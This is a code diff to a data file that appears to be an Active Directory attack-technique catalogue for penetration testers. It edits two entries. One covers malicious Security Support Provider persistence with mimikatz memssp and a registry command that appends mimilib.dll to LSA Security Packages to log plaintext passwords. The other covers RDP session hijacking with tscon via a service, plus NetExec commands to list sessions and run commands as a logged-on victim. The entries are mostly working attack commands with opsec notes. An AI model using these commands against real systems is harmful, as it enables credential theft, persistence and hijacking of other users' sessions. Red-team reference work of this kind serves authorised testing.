@@ -30,16 +30,18 @@ export const adPersistCredNodes: TechniqueNodeDef[] = [
     label: 'Custom SSP / memssp',
     phase: 'persistence',
     summary: 'Register a malicious SSP to log plaintext credentials.',
-    description: r`A Security Support Provider is a DLL loaded into LSASS that participates in authentication. Register a malicious SSP to log every credential that authenticates locally in cleartext: drop mimilib.dll and add it to the LSA Security Packages registry value (survives reboot), or load it in-memory via mimikatz misc::memssp (no disk artifact, lost on reboot). memssp writes captured passwords to C:\Windows\System32\mimilsa.log.`,
+    description: r`A Security Support Provider is a DLL loaded into LSASS that participates in authentication. Register a malicious SSP to log every credential that authenticates locally in cleartext: drop mimilib.dll and APPEND it to the LSA Security Packages registry value (survives reboot), or load it in-memory via mimikatz misc::memssp (no disk artifact, lost on reboot). The registry/mimilib.dll method logs to C:\Windows\System32\kiwissp.log; in-memory memssp logs to C:\Windows\System32\mimilsa.log.`,
     tools: [{ name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' }],
     commands: [
       { label: 'In-memory SSP (lost on reboot)', code: r`privilege::debug
 misc::memssp`, lang: 'powershell' },
-      { label: 'Persistent SSP via registry (mimilib.dll in System32)', code: r`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /d "mimilib" /t REG_MULTI_SZ`, lang: 'powershell' },
+      { label: 'Persistent SSP via registry (APPEND mimilib to the existing packages)', code: r`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f`, lang: 'cmd' },
     ],
     mitre: mitre('T1547.005'),
     references: [
-      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2' },{ label: 'HackTricks, Custom SSP', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/custom-ssp.html' }],
+      { label: 'Pentestlab, Persistence - Security Support Provider', url: 'https://pentestlab.blog/2019/10/21/persistence-security-support-provider/' },
+      { label: 'HackTricks, Custom SSP', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/custom-ssp.html' },
+    ],
     requires: ['Local admin / SYSTEM on the target (a DC for domain-wide capture)'],
     opsec: "memssp's mimilsa.log under System32 is a well-known IOC. The registry method persists across reboots but adds an audited entry to Security Packages; the in-memory method leaves no disk artifact but does not survive a reboot.",
     difficulty: 'medium',
@@ -121,12 +123,14 @@ nxc smb <host> -u <u> -p <p> -M keepass_trigger -o ACTION=ADD KEEPASS_CONFIG_PAT
     summary: "As SYSTEM, tscon into another user's RDP session, no password needed.",
     description:
       'From SYSTEM, the native tscon.exe reconnects any existing RDP session (active or disconnected) to your own session without the password or a prompt. Enumerate with query user, then connect to a more privileged session to inherit its interactive token and loaded credentials/tickets, which is quieter than dumping LSASS. A common trick launches tscon via a temporary service so it runs as SYSTEM.',
-    tools: [{ name: 'tscon.exe (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon' }],
+    tools: [{ name: 'tscon.exe (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon' }, { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' }],
     commands: [
       { label: 'List sessions and IDs', code: r`query user`, lang: 'cmd' },
       { label: 'As SYSTEM, hijack session 2 to the console', code: r`tscon 2 /dest:console`, lang: 'cmd' },
       { label: 'Get SYSTEM, then tscon via a service', code: r`sc create sesshijack binpath= "cmd.exe /k tscon 2 /dest:console"
 sc start sesshijack`, lang: 'cmd' },
+      { label: 'List interactive sessions to hijack (NetExec)', code: r`nxc smb <host> -u user -p pass --qwinsta`, lang: 'cmd' },
+      { label: 'Run a command as a logged-on user (NetExec schtask_as)', code: r`nxc smb <host> -u user -p pass -M schtask_as -o USER=victim CMD='whoami'`, lang: 'cmd' },
     ],
     mitre: mitre('T1563.002'),
     references: [
